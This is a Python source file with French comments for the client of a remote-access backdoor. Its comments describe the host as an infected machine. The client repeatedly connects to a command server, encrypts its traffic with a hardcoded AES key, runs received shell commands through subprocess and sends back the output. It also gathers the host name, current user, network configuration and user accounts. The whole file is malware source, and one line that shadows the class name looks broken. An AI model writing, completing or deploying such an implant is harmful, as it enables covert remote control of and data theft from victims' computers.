import socket
import os
import sys
import time
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from base64 import b64encode, b64decode

SERVER_ADDR = ("localhost", 60000)
LANGUAGE = "utf-8"
BUFFSIZE = 4096
KEY = b'AcVfgTjpKumnVftH'


class HP:
    """Création du socket"""
    def __init__(self):
        try:
            self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error:
            print("Socket cannot be created!")

    """Tentative de connection vers le serveur en boucle"""
    def start(self):
        try:
            #print("try to co ....")
            self.my_socket.connect(SERVER_ADDR)
            self.send(os.environ["COMPUTERNAME"])
        except ConnectionRefusedError:
            time.sleep(4)
            self.start()
        except TimeoutError:
            time.sleep(4)
            self.start()
            
    """Envoi des messages (contient le chiffrement)"""
    def send(self, message):
        send_b = message.encode(LANGUAGE)
        iv = get_random_bytes(16)
        cipher = AES.new(KEY, AES.MODE_CFB, iv)
        encrypted = b64encode(iv + cipher.encrypt(send_b))
        self.my_socket.send(encrypted)

    """Reception des messages (contient le déchiffrement)"""
    def receive(self):
        try:
            enc = self.my_socket.recv(BUFFSIZE).decode(LANGUAGE)
            enc = b64decode(enc)
            iv = enc[:16]
            cipher = AES.new(KEY, AES.MODE_CFB, iv)
            return cipher.decrypt(enc[16:]).decode(LANGUAGE)
        except ConnectionResetError:
            self.quit()

    """Fermeture du socket"""
    def quit(self):
        time.sleep(3)
        self.my_socket.close()

    """Méthode permettant à la machine infectée de pouvoir exécuter la commande reçue et d'en renvoyer la réponse"""
    def rev_shell(self, cmd):
        var = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out_byte = var.stdout.read() + var.stderr.read()
        out_str = out_byte.decode("utf-8", errors="replace")
        self.send(out_str)

"""
Fonction contenant le programme que nous ferons tourner indéfinimment
"""


def prog():
    HP = HP()
    HP.start()

    choice = HP.receive()

    while choice != "0":
        if choice == "1":
            HP.send(os.getcwd() + "> ")
            cmd = HP.receive()
            while cmd != "quit" and cmd is not None and cmd != "menu":
                if cmd[:2] == "cd":
                    os.chdir(cmd[3:])

                HP.rev_shell(cmd)
                HP.send("\n" + os.getcwd() + "> ")
                cmd = HP.receive()
            if cmd == "menu":
                choice = HP.receive()
            else:
                choice = "0"

        elif choice == "2":
            cmd = HP.receive()
            while cmd != "quit" and cmd is not None and cmd != "menu":
                if cmd == "computer":
                    HP.send(os.environ["COMPUTERNAME"])
                elif cmd == "current":
                    HP.rev_shell("whoami")
                elif cmd == "network":
                    HP.rev_shell("ipconfig")
                elif cmd == "users":
                    HP.rev_shell("net user")
                cmd = HP.receive()
            if cmd == "menu":
                choice = HP.receive()
            else:
                choice = "0"
        else:
            choice = HP.receive()

    HP.quit()


while True:
    prog()
